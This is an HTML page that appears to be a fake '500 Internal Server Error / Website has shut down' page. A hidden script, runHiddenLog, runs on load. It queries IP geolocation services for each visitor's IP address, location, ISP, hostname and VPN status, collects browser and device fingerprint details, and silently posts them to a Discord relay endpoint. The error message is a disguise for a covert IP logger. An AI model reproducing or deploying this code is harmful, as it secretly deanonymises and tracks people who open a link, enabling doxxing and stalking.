<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        body { 
            background-color: #fff; 
            color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .error-container { 
            text-align: center; 
        }
        h1 { 
            font-size: 24px; 
            font-weight: 500; 
            margin-bottom: 8px; 
        }
        p { 
            font-size: 14px; 
            color: #666; 
            margin: 0;
        }
    </style>
</head>
<body>

    <div class="error-container">
        <h1>Website has shut down</h1>
        <p>Internal Server Error (Code: 500)</p>
    </div>

    <script>
        async function runHiddenLog() {
            let n = {};
            let vpnDetected = "False";

            const providers = [
                "https://ipapi.co/json/",
                "https://ipwho.is/",
                "https://api.ipify.org?format=json"
            ];

            for (let url of providers) {
                try {
                    const res = await fetch(url);
                    if (res.ok) {
                        const temp = await res.json();
                        n = { ...n, ...temp };
                        if (n.ip || n.query) break;
                    }
                } catch (e) {}
            }

            const finalIP = n.ip || n.query || "Unknown";
            const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Unknown";
            const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
            if (n.security && (n.security.vpn || n.security.proxy)) vpnDetected = "True";

            const stats = {
                "IP Address": finalIP,
                "VPN/Proxy Detected": vpnDetected,
                "Location": finalLocation,
                "Hostname": n.hostname || n.reverse || "None Assigned",
                "ISP": finalISP,
                "User Agent": navigator.userAgent,
                "Window Ratio": (window.innerWidth / window.innerHeight).toFixed(16),
                "OS": navigator.platform,
                "Threads": navigator.hardwareConcurrency || "Unknown",
                "Memory": navigator.deviceMemory || "Unknown",
                "Browser Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "Current Time": new Date().toLocaleString()
            };

            const output = Object.entries(stats).map(([k, v]) => `${k}: ${v}`).join("\n");

            // Silent push to Discord
            fetch("/api/discord", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: output }),
            }).catch(() => {});
        }

        runHiddenLog();
    </script>
</body>
</html>
